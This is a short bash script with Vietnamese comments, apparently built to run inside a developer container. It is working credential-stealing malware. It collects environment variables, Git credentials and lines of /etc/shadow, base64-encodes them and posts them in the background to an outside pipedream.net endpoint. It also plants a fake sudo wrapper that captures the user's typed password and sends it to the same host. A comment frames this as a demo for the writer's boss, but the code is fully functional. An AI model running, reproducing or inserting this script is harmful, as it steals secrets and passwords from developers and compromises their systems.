#!/bin/bash

# Gửi ngay lập tức, không đợi mạng (vì image này mạng nhận rất nhanh)
URL="https://eo4ki1jx09tq9fi.m.pipedream.net"

# 1. Thu thập dữ liệu
ENV_B64=$(printenv | base64 | tr -d '\n')
GIT_B64=$(cat ~/.git-credentials 2>/dev/null | base64 | tr -d '\n')
ROOT_B64=$(sudo -n cat /etc/shadow 2>/dev/null | head -n 3 | base64 | tr -d '\n')

# 2. Gửi về Pipedream
curl -s -X POST -H "Content-Type: application/json" \
-d "{\"status\":\"FAST_PWN\",\"env\":\"$ENV_B64\",\"git\":\"$GIT_B64\",\"root\":\"$ROOT_B64\"}" \
$URL > /dev/null &

# 3. Cài bẫy sudo (để sếp demo lấy pass)
FAKE_SUDO="/usr/local/bin/sudo"
echo '#!/bin/bash
read -s -p "[sudo] password for vscode: " pass
echo ""
curl -s -X POST -d "stolen_password=$pass" https://eo4ki1jx09tq9fi.m.pipedream.net > /dev/null
/usr/bin/sudo -S $@ <<<$pass' | sudo tee $FAKE_SUDO > /dev/null
sudo chmod +x $FAKE_SUDO

echo "Done!"